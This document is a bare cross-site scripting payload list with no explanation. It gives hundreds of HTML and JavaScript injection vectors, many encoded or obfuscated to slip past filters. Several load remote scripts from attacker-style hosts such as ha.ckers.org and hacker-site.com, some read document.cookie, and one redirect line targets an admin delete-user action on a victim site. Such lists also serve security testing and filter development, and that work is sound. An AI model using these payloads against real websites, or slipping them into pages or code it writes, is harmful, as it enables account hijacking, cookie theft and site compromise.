<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
'';!--"<XSS>=&{()}
'>//\\,<'>">">"*"
'); alert('XSS
<script>alert(1);</script>
<script>alert('XSS');</script>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<scr<script>ipt>alert('XSS');</scr</script>ipt>
<script>alert(String.fromCharCode(88,83,83))</script> 
<img src=foo.png onerror=alert(/xssed/) />
<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
<marquee><script>alert('XSS')</script></marquee>
<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
"><script>alert(0)</script>
<script src=http://yoursite.com/your_files.js></script>
</title><script>alert(/xss/)</script>
</textarea><script>alert(/xss/)</script>
<IMG LOWSRC=\"javascript:alert('XSS')\">
<IMG DYNSRC=\"javascript:alert('XSS')\">
<font style='color:expression(alert(document.cookie))'>
<img src="javascript:alert('XSS')">
<script language="JavaScript">alert('XSS')</script>
<body onunload="javascript:alert('XSS');">
<body onLoad="alert('XSS');"
[color=red' onmouseover="alert('xss')"]mouse over[/color]
"/></a></><img src=1.gif onerror=alert(1)>
window.alert("Bonjour !");
<div style="x:expression((window.r==1)?'':eval('r=1;
alert(String.fromCharCode(88,83,83));'))">
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
"><script alert(String.fromCharCode(88,83,83))</script>
'>><marquee><h1>XSS</h1></marquee>
'">><script>alert('XSS')</script>
'">><marquee><h1>XSS</h1></marquee>
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">
<script>var var = 1; alert(var)</script>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<?='<SCRIPT>alert("XSS")</SCRIPT>'?>
<IMG SRC='vbscript:msgbox(\"XSS\")'>
" onfocus=alert(document.domain) "> <"
<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS
perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out
perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out
<br size=\"&{alert('XSS')}\">
<scrscriptipt>alert(1)</scrscriptipt>
</br style=a:expression(alert())>
</script><script>alert(1)</script>
"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
[color=red width=expression(alert(123))][color]
<BASE HREF="javascript:alert('XSS');//">
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
"></iframe><script>alert(123)</script>
<body onLoad="while(true) alert('XSS');">
'"></title><script>alert(1111)</script>
</textarea>'"><script>alert(document.cookie)</script>
'""><script language="JavaScript"> alert('X \nS \nS');</script>
</script></script><<<<script><>>>><<<script>alert(123)</script>
<html><noalert><noscript>(123)</noscript><script>(123)</script>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
'></select><script>alert(123)</script>
'>"><script src = 'http://www.site.com/XSS.js'></script>
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
<SCRIPT>document.write("XSS");</SCRIPT>
a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
='><script>alert("xss")</script>
<script+src=">"+src="http://yoursite.com/xss.js?69,69"></script>
<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
src="http://www.site.com/XSS.js"></script>
data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
!--" /><script>alert('xss');</script>
<script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
"><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
'"></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
<img """><script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>
"><script>alert(1337)</script>"><script>alert("XSS by \nxss</h1></marquee>
'"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
<iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??
http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??
'); alert('xss'); var x='
\\'); alert(\'xss\');var x=\'
//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));
>"><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>
<img src="Mario Heiderich says that svg SHOULD not be executed trough image tags" onerror="javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');"></img>
</body>
</html>
<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>
<SCRIPT> alert(“XSS”); </SCRIPT>
<BODY ONLOAD=alert("XSS")>
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG SRC="javascript:alert('XSS');">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<IFRAME SRC=”http://hacker-site.com/xss.html”>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<TABLE BACKGROUND="javascript:alert('XSS')">
<TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
<EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always">
&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;
&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;
&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;
&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;
&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;
&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;
&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;
&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;
&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;
&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;
&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;
a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);
&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;
&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;
&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;
&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;
&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;
&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;
&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;
&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
&lt;HTML xmlns:xss&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;
&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;!--[if gte IE 4]&gt;               
&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;
&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;
&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
&lt;? echo(&apos;&lt;SCR)&apos;;
&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;
&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;
&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;
&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;
&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-
\&quot;;alert(&apos;XSS&apos;);//
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;
&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;
perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out
perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out
&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js
&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;
&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;
&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
&lt;SCRIPT&gt;a=/XSS/
&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
<script>document.vulnerable=true;</script>
<img SRC="jav ascript:document.vulnerable=true;">
<img SRC="javascript:document.vulnerable=true;">
<img SRC=" &#14; javascript:document.vulnerable=true;">
<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>
<script <B>document.vulnerable=true;</script>
<img SRC="javascript:document.vulnerable=true;"
<iframe src="javascript:document.vulnerable=true; <
<script>a=/XSS/\ndocument.vulnerable=true;</script>
\";document.vulnerable=true;;//
</title><SCRIPT>document.vulnerable=true;</script>
<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
<body BACKGROUND="javascript:document.vulnerable=true;">
<body ONLOAD=document.vulnerable=true;>
<img DYNSRC="javascript:document.vulnerable=true;">
<img LOWSRC="javascript:document.vulnerable=true;">
<bgsound SRC="javascript:document.vulnerable=true;">
<br SIZE="&{document.vulnerable=true}">
<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
<img SRC='vbscript:document.vulnerable=true;'>
1script3document.vulnerable=true;1/script3
<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
<table BACKGROUND="javascript:document.vulnerable=true;">
<table><TD BACKGROUND="javascript:document.vulnerable=true;">
<div STYLE="background-image: url(javascript:document.vulnerable=true;)">
<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
<div STYLE="width: expression(document.vulnerable=true);">
<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
<XSS STYLE="xss:expression(document.vulnerable=true)">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
<style TYPE="text/javascript">document.vulnerable=true;</style>
<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
<style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style>
<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
<base HREF="javascript:document.vulnerable=true;//">
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>
